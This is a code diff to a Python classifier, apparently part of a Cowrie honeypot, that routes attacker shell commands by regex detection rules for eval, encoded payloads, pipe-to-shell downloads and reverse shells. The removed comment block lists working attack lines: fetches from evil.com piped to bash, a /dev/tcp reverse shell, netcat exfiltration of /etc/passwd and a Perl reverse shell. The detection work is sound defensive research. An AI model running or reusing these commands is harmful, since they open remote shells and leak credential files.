@@ -1,5 +1,4 @@
-import re, math
-from collections import Counter
+import re
 
 # ─── Group 1: Cowrie ─────────────────────────────────────────────────────────
 # Handles: basic commands, file ops, package install, sudo, download
@@ -22,6 +21,8 @@ BASIC_PATTERNS = [
     # Compression
     r'^(tar|zip|unzip|gzip|gunzip|bzip2|bunzip2|xz|7z|zcat|zless)(\s|$)',
     # Shell Built-ins
+    # Note: eval and exec appear here but _is_cloud() runs first in classify(),
+    # so eval/exec with execution semantics still routes to cloud correctly.
     r'^(env|alias|exit|history|printenv|source|eval|exec|type|which|whereis|whatis|man)(\s|$)',
     r'^export(?!\s+PATH=)\s+',
     # User/Group Management
@@ -36,7 +37,7 @@ BASIC_PATTERNS = [
     r'^(apt|apt-get|yum|dnf|pip|pip3|gem|npm|dpkg)\s+',
     # sudo anything
     r'^sudo\s+',
-    # Specific patterns (already safe — no alternation footguns)
+    # Specific patterns
     r'cat\s+/etc/(passwd|shadow|hosts|hostname|os-release|crontab|sudoers|group|fstab|issue|motd)',
     r'ls\s+(-\w+\s+)?(\/etc|\/var|\/tmp|\/root|\/home|\/proc|\/sys)',
     r'uname\s+-\w+',
@@ -60,7 +61,7 @@ ONDEVICE_PATTERNS = [
     r'^(journalctl|sar)(\s|$)',
     # Development Tools
     r'^(gcc|g\+\+|gdb|make)(\s|$)',
-    # Script execution
+    # Script execution (running a file, not an inline payload)
     r'^(python|python3|perl|ruby|php|node|lua)\s+',
     r'^\./\w+',
     r'^(bash|sh)\s+\S+',
@@ -72,40 +73,216 @@ ONDEVICE_PATTERNS = [
 ]
 
 # ─── Group 3: Cloud LLM ──────────────────────────────────────────────────────
-# Condition: high entropy + long OR many operators
+# Routes commands requiring SEMANTIC RECONSTRUCTION OF EXECUTION INTENT —
+# the real action cannot be determined without decoding, evaluating, or
+# reconstructing the payload from its indirect or encoded form.
+#
+# Design principle: cloud routing is about SEMANTIC RECONSTRUCTION, not impact.
+#   eval $(echo whoami)                      → FI 0, CLOUD     (intent hidden)
+#   python3 -c "import os; os.system('id')" → FI 0, CLOUD     (intent hidden)
+#   python3 -c "print(123)"                 → FI 0, ON-DEVICE  (intent explicit)
+#   rm -rf /                                → FI 4, NOT CLOUD  (intent explicit)
+#
+# Rules are grouped by the shell mechanism that obscures semantic intent.
+# No entropy thresholds or operator counts are used — every rule is anchored
+# to a concrete, nameable shell behaviour citable in a research paper.
 
-OPERATORS = ['|', '&&', '||', ';', '>', '>>', '<']
-HEX_ESCAPE = r'(\\x[0-9a-fA-F]{2}){6,}'
-BASE64_PATTERN = r'[A-Za-z0-9+/]{40,}={0,2}'
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+# Execution-intent keywords: presence inside an interpreter payload indicates
+# the one-liner is attempting to run system commands, not just compute.
+_EXEC_INTENT = (
+    r'os\.system\s*\('
+    r'|os\.execute\s*\('              # Lua: os.execute("/bin/sh")
+    r'|subprocess\.'
+    r'|pty\.spawn\s*\('
+    r'|\bpopen\s*\('
+    r'|\bsystem\s*\('
+    r'|\bexecl?\s*\('
+    r'|\bexecvp?\s*\('
+    r'|\bspawn\s*\('
+    r'|socket\.socket\s*\('           # reverse shell scaffolding
+    r'|connect\s*\(\s*\('             # socket.connect((...))
+    r"|dup2\s*\("                     # fd redirect in rev-shell
+    r'|TCPSocket\b'                   # Ruby reverse shell
+    r'|Net::Socket\b'                 # Perl reverse shell
+    r'|use\s+Socket\b'                # Perl socket import
+    r'|require\s*\(\s*["\']child_process["\']'  # Node.js exec
+    r'|\bexec\s*\(["\']'              # exec("cmd") inside interpreter
+    r'|\bexec\s+["\'/]'               # exec "/bin/sh" bare form (Ruby/Perl)
+    r'|\beval\s*\('                   # eval() inside interpreter payload
+)
+
+# Network-fetch prefixes: when these appear before a pipe, the pipe-to-interpreter
+# is loading a remote payload — not processing a local file.
+_NET_FETCH = r'(curl|wget|busybox\s+wget|fetch|lwp-download)\b'
+
+# ── Category A: Indirect execution ───────────────────────────────────────────
+# The outer shell delegates execution to a subshell or interpreter whose
+# argument string hides the real command. A reasoner must evaluate the
+# argument to reconstruct intent.
+#
+# Refinements:
+#   eval:        kept unconditional — any eval requires semantic reconstruction
+#   exec:        restricted to network FD redirection; plain `exec ls` is transparent
+#   bash/sh -c:  only escalate when the argument contains a subshell, encoding,
+#                or decoding operation — `bash -c 'ls'` is explicit and handled
+#                by Cowrie/on-device
+
+_INDIRECT = [
+    # eval always hides intent — the argument must be evaluated before intent is known
+    r'\beval\b',
+
+    # exec opening a network file descriptor — `exec 5<>/dev/tcp/...`
+    # NOT triggered by `exec ls` or `exec bash`
+    r'\bexec\s+\d+[<>]',
+
+    # bash -c / sh -c only when the argument contains subshell substitution,
+    # backticks, or a decoding pipeline — these hide what -c actually runs
+    r'(?:bash|sh)\s+-c\b.*\$\(',
+    r'(?:bash|sh)\s+-c\b.*`[^`]+`',
+    r'(?:bash|sh)\s+-c\b.*base64\s+-d',
+    r'(?:bash|sh)\s+-c\b.*base64\s+--decode',
+    r'(?:bash|sh)\s+-c\b.*xxd\s+-r',
+    r'(?:bash|sh)\s+-c\b.*openssl\b.*-d\b',
+]
+
+# ── Category B: Encoding / decoding ──────────────────────────────────────────
+# The payload is in an encoded form opaque to static reading.
+# Decoding is required before content — and therefore intent — is known.
+
+_DECODING = [
+    r'base64\s+-d',                      # echo <b64> | base64 -d | ...
+    r'base64\s+--decode',                # GNU long form
+    r'openssl\s+enc\b.*-d\b',           # openssl enc -d -aes-256-cbc ...
+    r'openssl\s+base64\s+-d',           # openssl base64 -d
+    r'xxd\s+-r',                         # xxd -r -p  (hex → binary)
+    r'(\\x[0-9a-fA-F]{2}){3,}',         # \x63\x61\x74 hex escape runs
+    r"printf\s+['\"]?(\\\\x[0-9a-fA-F]{2}){3,}",  # printf '\x63\x61\x74'
+]
+
+# ── Category C: Dynamic shell evaluation ─────────────────────────────────────
+# The command to execute is constructed at runtime. The outer shell cannot
+# know what will run until it evaluates the inner expression.
+#
+# Refinement: $(...) and backticks are only escalated when:
+#   (a) the substitution result IS the command (bare subshell)
+#   (b) the substitution feeds into execution via a pipe
+#   (c) the subshell contains execution-intent keywords
+#   Simple argument substitutions (`ls $(pwd)`) are NOT escalated.
+
+_DYNAMIC = [
+    # Bare subshell as the entire command
+    r'^\s*\$\([^)]+\)\s*$',
+    r'^\s*`[^`]+`\s*$',
+
+    # Subshell result piped into execution
+    r'\$\([^)]+\)\s*\|',
+    r'`[^`]+`\s*\|',
+
+    # Subshell wrapping an interpreter one-liner with execution intent
+    rf'\$\(.*(?:{_EXEC_INTENT}).*\)',
+    rf'`.*(?:{_EXEC_INTENT}).*`',
+
+    # Variable-splitting: $a$b trick to reconstruct a command name at runtime
+    r'\$[a-zA-Z_]\w*\$[a-zA-Z_]\w*',
+]
+
+# ── Category D: Interpreter-mediated execution ───────────────────────────────
+# An interpreter is invoked with an inline payload that contains
+# execution-intent primitives. Intent is buried inside a string argument
+# rather than expressed as a plain shell command — semantic reconstruction
+# is required to determine what will run.
+#
+# Refinement: interpreter -c alone does NOT trigger cloud. The payload must
+# also contain an execution-intent keyword so that:
+#   python3 -c "print(123)"                  → ON-DEVICE (no exec intent)
+#   python3 -c "import os; os.system('id')" → CLOUD     (exec intent present)
+#
+# Also added: find -exec sh, xargs sh, awk system(), rpm lua eval.
+
+_INTERPRETER = [
+    # Interpreter one-liners with execution intent in the payload
+    rf'python3?\s+-c\b.*(?:{_EXEC_INTENT})',
+    rf'perl\s+-e\b.*(?:{_EXEC_INTENT})',
+    rf'ruby\s+-e\b.*(?:{_EXEC_INTENT})',
+    rf'node\s+-e\b.*(?:{_EXEC_INTENT})',
+    rf'php\s+-r\b.*(?:{_EXEC_INTENT})',
+    rf'lua\s+-e\b.*(?:{_EXEC_INTENT})',
+
+    # awk / tclsh with system() call
+    r'\bawk\b.*\bsystem\s*\(',          # awk '{system("sh")}' or BEGIN{system(...)}
+    r'\btclsh\b.*\beval\b',             # tclsh: eval exec id
+
+    # find delegating execution to a shell
+    r'\bfind\b.*-exec\s+(bash|sh)\b',   # find / -exec bash -c '...' \;
+    r'\bfind\b.*-exec\s+\S*sh\b',       # find / -exec /bin/sh \;
+
+    # xargs delegating to a shell
+    r'\bxargs\b.*(bash|sh)\s+-c\b',     # xargs bash -c '...'
+    r'\bxargs\b.*\b(bash|sh)\b\s*$',    # ... | xargs bash
+
+    # rpm lua eval
+    r'\brpm\b.*--eval\b.*\blua\b',
+]
+
+# ── Category E: Pipe-to-interpreter ──────────────────────────────────────────
+# A payload is streamed into an interpreter. Only escalated when the SOURCE
+# is a network fetch or a decoding operation — making the executed content
+# invisible in the command. Local-file pipes (`cat file.py | python3`) are NOT
+# escalated since the content is statically present on disk.
+
+_PIPE_TO_INTERP = [
+    # Network fetch piped into a shell or interpreter
+    rf'{_NET_FETCH}[^|]*\|\s*(bash|sh|python3?|perl|ruby|php|node)\b',
+
+    # Decoded payload piped into execution
+    r'base64\s+(-d|--decode)[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
+    r'xxd\s+-r[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
+    r'openssl\b[^|]*-d\b[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
+]
+
+# ── Category F: Reverse-shell primitives ─────────────────────────────────────
+# These constructs open a raw bidirectional network channel back to an attacker.
+# Cowrie and the on-device model cannot meaningfully emulate these.
+
+_REVERSE_SHELL = [
+    r'/dev/tcp/',                        # bash -i >& /dev/tcp/ip/port 0>&1
+    r'/dev/udp/',                        # sh -i >& /dev/udp/ip/port 0>&1
+    r'\bmkfifo\b',                       # mkfifo /tmp/f; cat /tmp/f | nc ...
+    r'\bsocat\b',                        # socat exec:'bash -li',...
+    r'\bnc\b.*-e\b',                    # nc -e /bin/sh ip port
+    r'\bncat\b.*-e\b',                  # ncat -e /bin/bash ip port
+]
+
+# ── Combined check ────────────────────────────────────────────────────────────
 
 def _is_cloud(cmd: str) -> bool:
-    if _entropy(cmd) > 4.8 and len(cmd) >= 90:
-        return True
+    """
+    Return True when the command requires cloud LLM reasoning because its
+    real execution intent cannot be determined without semantic reconstruction
+    — i.e. without decoding, evaluating, or re-assembling an indirect payload.
 
-    # count operators properly
-    op_count = 0
-    op_count += cmd.count('&&')
-    op_count += cmd.count('||')
-    op_count += cmd.count('>>')
-    op_count += len(re.findall(r'(?<!>)>(?!>)', cmd))   # single > only
-    op_count += len(re.findall(r'\|(?!\|)', cmd))        # single | only
-    op_count += cmd.count(';')
-    op_count += cmd.count('<')
+    All rules are anchored to a concrete, nameable shell mechanism.
+    No entropy thresholds or operator-count heuristics are used.
+    """
+    all_rules = (
+        _INDIRECT
+        + _DECODING
+        + _DYNAMIC
+        + _INTERPRETER
+        + _PIPE_TO_INTERP
+        + _REVERSE_SHELL
+    )
+    return any(re.search(pattern, cmd) for pattern in all_rules)
 
-    if op_count >= 2:
-        return True
-    if re.search(r'(\\x[0-9a-fA-F]{2}){6,}', cmd):
-        return True
-    if re.search(BASE64_PATTERN, cmd):
-        return True
-    return False
 
 # ─── Classifier ──────────────────────────────────────────────────────────────
 
 def classify(cmd: str, session_history: list) -> str:
     cmd = cmd.strip()
 
-    # Cloud first — complex/obfuscated
+    # Cloud first — requires semantic reconstruction of execution intent
     if _is_cloud(cmd):
         return 'cloud'
 
@@ -113,7 +290,7 @@ def classify(cmd: str, session_history: list) -> str:
     if _matches(cmd, BASIC_PATTERNS):
         return 'cowrie'
 
-    # On-Device — execution + version + service status
+    # On-Device — script execution + service status + context-dependent
     if _matches(cmd, ONDEVICE_PATTERNS):
         return 'on_device'
 
@@ -125,11 +302,6 @@ def classify(cmd: str, session_history: list) -> str:
 def _matches(cmd: str, patterns: list) -> bool:
     return any(re.search(p, cmd) for p in patterns)
 
-def _entropy(text: str) -> float:
-    if not text: return 0
-    counts = Counter(text)
-    total  = len(text)
-    return -sum((c/total) * math.log2(c/total) for c in counts.values())
 
 if __name__ == "__main__":
     test_cmds = ["hello", "hey", "hi", "wtf", "what"]
@@ -144,41 +316,3 @@ if __name__ == "__main__":
             for p in patterns:
                 if re.search(p, cmd):
                     print(f"   matched {group_name}: {p}")
-
-# test case
-# ── 1. Base64 Encoded ─────────────────────────────────────────────────────────
-# echo "cm0gLXJmIC92YXIvbG9n" | base64 -d | bash
-# echo "d2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=" | base64 -d | sh
-
-# # ── 2. Hex Escape ─────────────────────────────────────────────────────────────
-# echo $'\x77\x68\x6f\x61\x6d\x69'
-# echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
-
-# # ── 3. Variable Splitting ─────────────────────────────────────────────────────
-# c='rm';d=' -rf';e=' /tmp';$c$d$e
-# p='pa';s='ss';w='wd';$p$s$w root
-# c='ca';d='t';e=' /etc/passwd';$c$d$e
-
-# # ── 4. XOR Obfuscation ────────────────────────────────────────────────────────
-# $(python3 -c "print(''.join(chr(ord(c)^0x41) for c in 'OLSSV^BUHU[LY^JVTTHUK^AOLA^LCL'))")
-
-# # ── 5. Exploit Chain (wget → chmod → execute) ─────────────────────────────────
-# wget http://evil.com/shell.sh && chmod +x shell.sh && ./shell.sh
-# curl http://evil.com/shell.sh && bash shell.sh && rm shell.sh
-
-# # ── 6. Reverse Shell ──────────────────────────────────────────────────────────
-# bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
-
-# # ── 7. Dynamic Script Execution (pipe to shell) ───────────────────────────────
-# curl http://192.168.1.1/shell.sh | bash
-# wget -O - http://evil.com/shell.sh | sh
-
-# # ── 8. Multi-Pipe Exfiltration ────────────────────────────────────────────────
-# cat /etc/passwd | grep root | cut -d: -f1 | nc 192.168.1.1 4444
-
-# # ── 9. Perl Encrypted Reverse Shell ──────────────────────────────────────────
-# perl -e 'use Socket;$i="192.168.1.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
-
-# # ── 10. Backtick Eval ─────────────────────────────────────────────────────────
-# eval $(echo "d2hvYW1p" | base64 -d)
-# `echo "aWQ=" | base64 -d`
